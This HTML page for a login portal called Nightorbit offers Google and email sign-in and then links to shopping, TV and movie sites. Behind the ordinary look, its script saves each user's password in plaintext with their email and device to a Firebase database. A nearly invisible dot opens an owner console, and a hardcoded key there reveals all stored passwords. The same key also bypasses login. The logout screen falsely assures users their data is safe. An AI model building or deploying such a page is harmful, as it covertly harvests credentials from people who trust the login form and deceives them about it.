<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Gyidi bazar and cinema.Nightorbit</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        :root { --primary: #00d2ff; --neon: #ff0055; --gold: #ffd700; --bg: #05070a; }
        * { box-sizing: border-box; }
        body { 
            margin: 0; padding: 0; width: 100%; height: 100vh; 
            background: radial-gradient(circle at center, #1B2735 0%, var(--bg) 100%);
            font-family: 'Segoe UI', sans-serif; color: white;
            display: flex; align-items: center; justify-content: center; overflow: hidden;
        }
        .card { 
            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
            padding: 40px; border-radius: 30px; text-align: center; 
            width: 360px; border: 1px solid rgba(255,255,255,0.1); 
            box-shadow: 0 25px 50px rgba(0,0,0,0.8); position: relative; z-index: 10;
        }
        /* THREE DOTS - LEFT SIDE (FIXED) */
        .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); z-index: 100; opacity: 0.7; }
        .pass-wrapper { position: relative; width: 100%; }
        .pass-wrapper i { position: absolute; right: 15px; top: 22px; cursor: pointer; color: #888; }
        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.4); color: white; outline: none; }
        .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .btn-google { background: white; color: black; border: none; padding: 12px; border-radius: 12px; width: 100%; margin-top: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .link-card { background: rgba(255,255,255,0.07); padding: 15px; border-radius: 15px; margin: 12px 0; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: white; border-left: 4px solid var(--neon); transition: 0.3s; font-size: 14px; }
        #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
        .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; }
        #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
        .hidden { display: none !important; }
        .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }
    </style>
</head>
<body>

    <div id="logout-overlay">
        <div style="font-size: 60px; margin-bottom: 20px;">âœ¨</div>
        <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 19px; max-width: 500px;"></div>
    </div>

    <div id="admin-panel">
        <h1 style="color: var(--primary);">Owner Console</h1>
        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 30px; margin-bottom: 20px;">Exit</button>
        <div id="user-rows-container"></div>
    </div>

    <div class="menu-dots" onclick="bypassLogin()">â‹®</div>
    <div class="admin-dot" onclick="adminAccess()">.</div>

    <div id="login-box" class="card">
        <h1 style="color: var(--primary); margin: 0; font-size: 32px; letter-spacing: 2px; font-weight: 800;">NIGHTORBIT</h1>
        <button class="btn-google" onclick="authGoogle()">SIGNUP WITH GOOGLE</button>
        <div style="margin: 20px 0; color: #444; font-size: 10px;">â€” SECURE LOGIN â€”</div>
        <input type="email" id="u-email" placeholder="Email Address">
        <div class="pass-wrapper">
            <input type="password" id="u-pass" placeholder="Password (One Name Only)">
            <i class="fa-solid fa-eye" id="togglePass" onclick="togglePassword()"></i>
        </div>
        <button class="btn-main" onclick="authEmail()">Login / Signup</button>
        <p id="error-msg" style="color: var(--neon); font-size: 11px; margin-top: 10px;"></p>
    </div>

    <div id="member-area" class="card hidden">
        <h2 id="user-welcome" style="color: var(--primary);">Welcome!</h2>
        <div style="text-align: left; margin-top: 20px;">
            <a href="https://www.daraz.pk" target="_blank" class="link-card">ðŸ›’ Daraz Mall <span>PK</span></a>
            <a href="https://tamashaweb.com/" target="_blank" class="link-card" style="border-left-color: var(--gold);">ðŸ“º Tamasha App <span>TV</span></a>
            <a href="https://bollyflix.org.in/" target="_blank" class="link-card" style="border-left-color: var(--primary);">ðŸŽ¬ Watch Movies <span>HD</span></a>
        </div>
        <button onclick="logoutSequence()" style="margin-top: 30px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline;">Secure Logout</button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBxJqJkrAaFf3eR0QWvhet6IvvFVHYExeU",
            authDomain: "my-market-ff254.firebaseapp.com",
            projectId: "my-market-ff254",
            storageBucket: "my-market-ff254.appspot.com",
            messagingSenderId: "1039626785987",
            appId: "1:1039626785987:web:ae5a65a0b16444a2cffe76",
            databaseURL: "https://my-market-ff254-default-rtdb.firebaseio.com"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();

        // 1. CLEAN DEVICE NAME LOGIC
        function getDeviceBrand() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) {
                if (/samsung/i.test(ua)) return "Samsung";
                if (/infinix/i.test(ua)) return "Infinix";
                if (/oppo/i.test(ua)) return "Oppo";
                if (/vivo/i.test(ua)) return "Vivo";
                if (/xiaomi|redmi/i.test(ua)) return "Xiaomi";
                if (/tecno/i.test(ua)) return "Tecno";
                if (/realme/i.test(ua)) return "Realme";
                return "Android Phone";
            }
            if (/iPhone|iPad|iPod/i.test(ua)) return "Apple iPhone";
            return "PC/Desktop";
        }

        function togglePassword() {
            const p = document.getElementById('u-pass');
            p.type = p.type === "password" ? "text" : "password";
        }

        function bypassLogin() {
            if (prompt("Master Key:") === "rr123456789000rr") showMemberUI("Admin Farooq");
        }

        function authGoogle() {
            const provider = new firebase.auth.GoogleAuthProvider();
            auth.signInWithPopup(provider).then(res => {
                let p = prompt("Enter Password (Ek Mukammal Naam):");
                // Check if password is a single word
                if (!p || p.trim().includes(" ")) {
                    alert("Error: Password sirf ek naam hona chahiye (No Spaces)!");
                    auth.signOut();
                } else {
                    processUser(res.user, p);
                }
            });
        }

        function authEmail() {
            const e = document.getElementById('u-email').value;
            const p = document.getElementById('u-pass').value;
            if(!e || !p) return alert("Fill fields!");
            if(p.trim().includes(" ")) return alert("Error: Password sirf ek naam hona chahiye!");

            auth.signInWithEmailAndPassword(e, p).then(res => processUser(res.user, p))
            .catch(() => {
                auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p))
                .catch(() => alert("Invalid Account/Password"));
            });
        }

        function processUser(user, pass) {
            db.ref('users/' + user.uid).once('value', (snap) => {
                const data = snap.val();
                let secretName = (data && data.savedName) ? data.savedName : "Member";
                db.ref('users/' + user.uid).update({
                    email: user.email,
                    password: pass,
                    device: getDeviceBrand(),
                    savedName: secretName,
                    time: new Date().toLocaleString()
                }).then(() => showMemberUI(user.displayName || secretName));
            });
        }

        function adminAccess() {
            if (prompt("Admin Key:") === "rr123456789000rr") {
                document.getElementById('admin-panel').style.display = 'block';
                db.ref('users').on('value', (snap) => {
                    let html = "";
                    snap.forEach(c => {
                        let v = c.val();
                        html += `<div class="admin-card">
                            <b style="color:var(--gold)">Secret: ${v.savedName}</b><br>
                            <span>Device: ${v.device}</span><br>
                            <span style="color:#fff">Password: ${v.password}</span><br>
                            <small style="color:#666">${v.time}</small>
                        </div>`;
                    });
                    document.getElementById('user-rows-container').innerHTML = html;
                });
            }
        }

        function showMemberUI(name) {
            document.getElementById('login-box').classList.add('hidden');
            document.getElementById('member-area').classList.remove('hidden');
            document.getElementById('user-welcome').innerText = "Hello, " + name;
        }

        function logoutSequence() {
            const overlay = document.getElementById('logout-overlay');
            document.getElementById('bye-text-display').innerHTML = `
                <span style="font-size: 26px; color: var(--gold); font-weight: bold;">Goodbye!</span><br><br>
                It was an absolute pleasure having you with us today. 
                Your data is safe and your session is closing securely.<br><br>
                May God bless you with happiness and success in every step of your life.<br><br>
                <i>"Stay safe, stay blessed, and always keep smiling. Allah Hafiz!"</i>
            `;
            overlay.style.display = 'flex';
            setTimeout(() => { location.reload(); }, 6000);
        }
    </script>
</body>
</html>
